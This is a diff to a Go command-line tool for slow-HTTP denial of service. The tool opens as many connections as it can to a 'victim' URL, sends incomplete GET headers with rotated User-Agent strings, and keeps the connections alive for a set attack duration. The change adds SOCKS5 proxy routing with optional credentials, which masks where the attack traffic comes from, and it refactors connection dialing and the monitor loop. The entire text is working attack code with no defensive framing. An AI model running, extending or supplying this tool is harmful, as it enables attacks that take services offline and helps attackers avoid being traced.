@@ -11,16 +11,21 @@ import (
 	"os"
 	"strings"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 type attackParams struct {
-	serverURL *url.URL
-	maxConn   *uint64
-	currConn  *uint64
-	timeout   *uint64
-	agents    []string
-	duration  *uint64
-	auto      *bool
+	serverURL   *url.URL
+	maxConn     *uint64
+	currConn    *uint64
+	timeout     *uint64
+	agents      []string
+	duration    *uint64
+	auto        *bool
+	proxy       *bool
+	proxyServer *string
+	proxyAuth   *proxy.Auth
 }
 
 type connection struct {
@@ -39,6 +44,49 @@ func main() {
 	if tcperr != nil {
 		log.Fatalf("%v\n", tcperr)
 	}
+
+	var dial func() (net.Conn, error)
+	if *attack.proxy {
+		log.Println("Trying to setup the sock5 proxy")
+		proxyDialer, err := proxy.SOCKS5(endpoint.Network(), *attack.proxyServer, attack.proxyAuth, proxy.Direct)
+		if err != nil {
+			log.Fatalf("%v\n", err)
+		}
+
+		log.Println("sock5 is up")
+
+		dial = func() (net.Conn, error) {
+			conn, cerr := proxyDialer.Dial(endpoint.Network(), endpoint.String())
+			if cerr != nil {
+				return nil, cerr
+			}
+
+			tcpConn := conn.(*net.TCPConn)
+			lerr := tcpConn.SetLinger(0)
+			if lerr != nil {
+				return nil, lerr
+			}
+
+			return conn, nil
+		}
+
+	} else {
+		dial = func() (net.Conn, error) {
+			conn, err := net.Dial(endpoint.Network(), endpoint.String())
+			if err != nil {
+				return nil, err
+			}
+
+			tcpConn := conn.(*net.TCPConn)
+			lerr := tcpConn.SetLinger(0)
+			if lerr != nil {
+				return nil, lerr
+			}
+
+			return conn, nil
+		}
+	}
+
 	currConnections := uint64(0)
 	attack.currConn = &currConnections
 
@@ -51,18 +99,19 @@ func main() {
 	for ; i <= cons; i++ {
 		agent := attack.agents[rand.Intn(len(attack.agents))]
 
-		connection, err := createConnection(endpoint, attack.serverURL.Path, agent, i, quit)
+		connection, err := createConnection(endpoint, attack.serverURL.Path, agent, dial, i)
 		if err != nil {
-			switch err.Err.(type) {
+			opErr := err.(*net.OpError)
+			switch opErr.Err.(type) {
 			case *os.SyscallError:
 				// os related errors, e.g.
 				// connection refuse from the server, socket opening problems
-				log.Println(err.Err)
+				log.Println(opErr.Err)
 				log.Println("Starting a new monitoring routine")
 			case *net.DNSError:
 				// if we reached this case, then most
 				// probably the host does not exists
-				log.Fatalln(err.Err)
+				log.Fatalln(opErr.Err)
 			default:
 				// should not reach here
 				log.Fatalln("Unknown error, terminating the program")
@@ -75,7 +124,7 @@ func main() {
 		}
 	}
 
-	go monitor(attack, endpoint, i, quit)
+	go monitor(attack, endpoint, i, dial, quit)
 
 	time.Sleep(time.Second * time.Duration(*attack.duration))
 }
@@ -122,7 +171,7 @@ func (m *connection) start(counter, timeout *uint64, quit chan bool) {
 }
 
 // tries to create as much tcp connections as possible
-func monitor(attack *attackParams, address *net.TCPAddr, id int, quit chan bool) {
+func monitor(attack *attackParams, address *net.TCPAddr, id int, dial func() (net.Conn, error), quit chan bool) {
 	retry := time.Second * time.Duration(*attack.timeout)
 
 	for {
@@ -132,21 +181,26 @@ func monitor(attack *attackParams, address *net.TCPAddr, id int, quit chan bool)
 		default:
 			log.Println("Trying to open a new socket from the monitor routine...")
 
-			connection, err := createConnection(address, attack.serverURL.Path, attack.agents[rand.Intn(len(attack.agents))], id, quit)
-			if err != nil && (*attack.maxConn >= *attack.currConn || *attack.auto) {
-				time.Sleep(retry)
-				continue
+			if *attack.maxConn > *attack.currConn || *attack.auto {
+				connection, err := createConnection(address, attack.serverURL.Path, attack.agents[rand.Intn(len(attack.agents))], dial, id)
+
+				if err != nil {
+					time.Sleep(retry)
+					continue
+				} else {
+					log.Printf("Successfully opened #%d socket\n", id)
+				}
+				(*attack.currConn)++
+				go connection.start(attack.currConn, attack.timeout, quit)
+				id++
 			} else {
-				log.Printf("Successfully opened #%d socket\n", id)
+				time.Sleep(retry)
 			}
-			(*attack.currConn)++
-			go connection.start(attack.currConn, attack.timeout, quit)
-			id++
 		}
 	}
 }
 
-func createConnection(address *net.TCPAddr, path, agent string, id int, quit chan bool) (*connection, *net.OpError) {
+func createConnection(address *net.TCPAddr, path, agent string, dial func() (net.Conn, error), id int) (*connection, error) {
 	payload := func() string {
 		var headerPath string
 		if path == "" {
@@ -158,15 +212,9 @@ func createConnection(address *net.TCPAddr, path, agent string, id int, quit cha
 		return fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent:%s\r\n", headerPath, address.IP.String(), agent)
 	}()
 
-	conn, err := net.DialTCP("tcp", nil, address)
+	conn, err := dial()
 	if err != nil {
-		return nil, err.(*net.OpError)
-	}
-
-	// abandon any unsent data
-	linerr := conn.SetLinger(0)
-	if linerr != nil {
-		return nil, linerr.(*net.OpError)
+		return nil, err
 	}
 
 	return &connection{&payload, id, conn}, nil
@@ -179,6 +227,11 @@ func parseArguments() *attackParams {
 	agentsPath := flag.String("ap", "agents.txt", "The file name with varius User-Agent headers. Is optional")
 	duration := flag.Uint64("d", 10*60, "The duration of the attack in seconds")
 	auto := flag.Bool("a", false, "Take all resources available automatically")
+	useProxy := flag.Bool("proxy", false, "Use sock5 proxy")
+	proxyAddress := flag.String("pa", "", "The address of the proxy server [host:port]")
+	proxyUser := flag.String("pu", "", "The username for the proxy auth")
+	proxyPassword := flag.String("ppw", "", "The password for the proxy auth")
+
 	flag.Parse()
 
 	if !strings.Contains(*server, "http://") && !strings.Contains(*server, "https://") {
@@ -189,6 +242,20 @@ func parseArguments() *attackParams {
 	victimURL, err := url.ParseRequestURI(*server)
 	if err != nil {
 		log.Fatalln(err)
+	}
+
+	if *useProxy && *proxyAddress == "" {
+		log.Fatalln("No proxy server specified")
+	}
+
+	var credentials *proxy.Auth
+	if *proxyUser == "" || *proxyPassword == "" {
+		credentials = nil
+	} else {
+		credentials = &proxy.Auth{
+			User:     *proxyUser,
+			Password: *proxyPassword,
+		}
 	}
 
 	var userAgents []string
@@ -206,12 +273,15 @@ func parseArguments() *attackParams {
 	}
 
 	attack := attackParams{
-		serverURL: victimURL,
-		maxConn:   connectionsNr,
-		timeout:   timeout,
-		agents:    userAgents,
-		duration:  duration,
-		auto:      auto,
+		serverURL:   victimURL,
+		maxConn:     connectionsNr,
+		timeout:     timeout,
+		agents:      userAgents,
+		duration:    duration,
+		auto:        auto,
+		proxy:       useProxy,
+		proxyServer: proxyAddress,
+		proxyAuth:   credentials,
 	}
 
 	return logSetup(&attack)
